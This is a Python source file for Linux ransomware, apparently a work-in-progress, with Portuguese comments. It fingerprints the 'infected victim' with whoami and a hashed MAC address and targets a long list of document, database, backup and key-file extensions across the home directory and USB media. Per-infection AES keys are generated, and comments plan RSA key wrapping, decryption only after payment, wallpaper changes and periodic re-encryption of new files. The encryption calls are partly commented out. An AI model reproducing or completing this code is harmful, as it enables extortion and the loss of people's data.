#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho

import os
import socket
from random import choice
import getpass
import sys
import json
import subprocess
import hashlib
import time

from AES import *
from RSA import *
from SRSA import *


file_types = '''.doc .docx .xls .xlsx .ppt .pptx .pst .ost .msg .eml .vsd .vsdx .txt .csv .rtf .wks .wk1 .pdf .dwg .onetoc2 .snt .jpeg .jpg .docb .docm .dot .dotm .dotx .xlsm .xlsb .xlw .xlt .xlm .xlc .xltx .xltm .pptm .pot .pps .ppsm .ppsx .ppam .potx .potm .edb .hwp .602 .sxi .sti .sldx .sldm .sldm .vdi .vmdk .vmx .gpg .aes .ARC .PAQ .bz2 .tbk .bak .tar .tgz .gz .7z .rar .zip .backup .iso .vcd .bmp .png .gif .raw .cgm .tif .tiff .nef .psd .ai .svg .djvu .m4u .m3u .mid .wma .flv .3g2 .mkv .3gp .mp4 .mov .avi .asf .mpeg .vob .mpg .wmv .fla .swf .wav .mp3 .sh .class .jar .java .rb .asp .php .jsp .brd .sch .dch .dip .pl .vb .vbs .ps1 .bat .cmd .js .asm .h .pas .cpp .c .cs .suo .sln .ldf .mdf .ibd .myi .myd .frm .odb .dbf .db .mdb .accdb .sql .sqlitedb .sqlite3 .asc .lay6 .lay .mml .sxm .otg .odg .uop .std .sxd .otp .odp .wb2 .slk .dif .stc .sxc .ots .ods .3dm .max .3ds .uot .stw .sxw .ott .odt .pem .p12 .csr .crt .key .pfx .der'''

# infected victim class
class infected():
    def __init__(self):
        self.nome_pc = None
        self.id = None

    def get_name(self):
        self.comando = subprocess.Popen('whoami', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.nome_pc = self.comando.stdout.read().replace('\n','')

    def get_id(self):
        self.comando = subprocess.Popen('ifconfig -a | grep ether', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.saida = self.comando.stdout.read()
        self.s = self.saida.split()
        self.mac_addr = self.s[1]
        self.id = hashlib.sha256(self.mac_addr).hexdigest()


def get_user():
    caminho = os.environ['HOME']+'/Desktop/'
    caminho2 = os.environ['HOME']+'/Área\ de\ Trabalho/'
    if(os.path.isdir(caminho)):
        caminho_correto = caminho
    elif(os.path.isdir(caminho2)):
        caminho_correto = caminho2

    usuario = infected()
    usuario.get_name()
    nome_pc = usuario.nome_pc
    print(nome_pc)
    usuario.get_id()
    id_pc = usuario.id
    print(id_pc)
    data = {'id': id_pc, 'nome': nome_pc , 'btc_addr': None}
    string_data = json.dumps(data)
    with open(caminho_correto + 'config.json','wb') as f:
        f.write(string_data.encode())

    # ler campos
    # open('config.json','rb')
    # dados = f.read()
    # obj = json.loads(dados)
    # print(obj['id'])


'''
NOVAS COISAS :
 - arquivo na area de trabalho com todos os arquivos criptografados.
 - rotina  -> (depois de criptografar tudo):
    de 1 em 1 minuto
    checar se tem algum arquivo novo -> salvar todos os arquivos numa lista. se tiver novo arquivo -> criptografa ele
    trocar o wallpaper dnv
'''

# Starting point of encrypting
def menu(senha_AES):
    tipos_arquivos = file_types.split(' ')
    home = os.environ['HOME'] # /home/user is the start point
    comeco = time.time()
    listar(senha_AES, home, tipos_arquivos)
    print(time.time()-comeco)
    #listar_media(senha_AES,tipos_arquivos)

# look's for external media such as usb / hd's
def listar_media(senha_AES, tipos_arq):
    print('Procurando por pendrives/HDs')
    caminho = '/media/'+getpass.getuser()
    if(os.path.isdir(caminho)):
        listar(senha_AES,caminho,tipos_arq)


# lists and encrypt files
def listar(chave_AES,diretorio, tipos_arq):
    ignorar = diretorio + '/.avfs'
    home = os.environ['HOME']
    listagem_dos_diretorios = os.listdir(diretorio)
    for elemento in listagem_dos_diretorios:
        if(elemento == '.avfs'):
            listagem_dos_diretorios.remove('.avfs') # remove virtual directory

    encrypt_list = [] # list of files found
    for elemento in listagem_dos_diretorios: # start looking throught the home directory of the user
        for caminho, diret, arquivo in os.walk(os.path.join(home, elemento)):
            for arq in arquivo:
                file_found = os.path.join(caminho, arq)
                extensao = os.path.splitext(file_found)
                for ext in tipos_arq:
                    if(extensao[1] == ext): # found file with the extension
                        encrypt_list.append(file_found)
    print(encrypt_list)

'''
    for element in encrypt_list: # encrypt happens here
        try:
            criptografa(chave_AES , element)
        except:
            print('Error Encrypting file: '+ element)
'''


# Generate random AES key for each infection
def gera_chave_AES():
    caminho = os.environ['HOME']+'/Desktop/'
    caminho2 = os.environ['HOME']+'/Área\ de\ Trabalho/'
    if(os.path.isdir(caminho)):
        caminho_correto = caminho
    elif(os.path.isdir(caminho2)):
        caminho_correto = caminho2

    tamanho = 128 # bytes
    caracters = '0123456789abcdefghijlmnopqrstuwvxz-/*&#@!=-.,'
    senha = ''
    for char in xrange(tamanho):
        senha += choice(caracters)

    with open(caminho_correto + 'AES.txt','w') as f:
        f.write(senha)
    return senha

# change the backgroud of the computer
def change_background():
    os.system('gsettings set org.gnome.desktop.background picture-uri '+ os.getcwd()+'/wallpaper.jpg')

def crypto_all():
    AES_key = gera_chave_AES()
    print('[*] Chave AES gerada')
    menu(AES_key) # -> Encrypt everything
    '''AES_to_RSA()
    print('[*] Senha AES criptografado com chave RSA')
    RSA_to_SRSA()
    print('[*] Chave privada do cliente criptografada')
'''

# MAIN
if __name__ == "__main__":
    crypto_all()
    #change_background()
    #get_user()
    #pass







# == ALGORITMO ==
    # criptografa todos os arquivos com AES

    # criptografa a chave AES

    # criptografa a chave privada RSA


    ############### SE PAGAR #####################


    # descriptografa a chave privada (R) com a chave privada(S)

    # descriptografa a chave AES, com a chave privada (R)

    # descriptografa todos os arquivos com a chave AES
